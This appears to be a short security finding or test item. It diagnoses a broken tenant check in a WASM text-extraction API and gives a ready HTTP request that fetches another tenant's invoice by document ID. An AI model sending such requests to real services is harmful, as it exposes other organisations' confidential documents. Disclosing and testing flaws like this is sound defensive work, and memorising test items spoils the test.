diagnosis: The WASM text extraction endpoint reads documents from the filesystem by documentId without verifying that the document belongs to req.user.tenantId. Any user can pass document IDs of invoices, contracts, or tax returns of other organizations and receive extracted plaintext.
exploit_request:
POST /api/wasm/extract-text HTTP/1.1
Host: docparse.cloudservices.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "documentId": "invoice_tenant_882_may2026"
}
